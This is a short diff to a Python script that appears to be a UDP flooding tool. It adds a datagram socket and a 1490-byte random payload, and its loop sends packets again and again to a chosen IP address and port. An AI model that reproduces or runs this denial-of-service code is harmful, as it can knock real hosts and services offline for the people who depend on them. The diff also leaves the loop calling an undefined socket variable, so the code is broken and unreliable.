@@ -8,6 +8,11 @@ import time
 import fade
 os.system("clear")
 
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -79,7 +84,6 @@ def run():
 	i = random.choice(("[+]"))
 	while True:
 		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
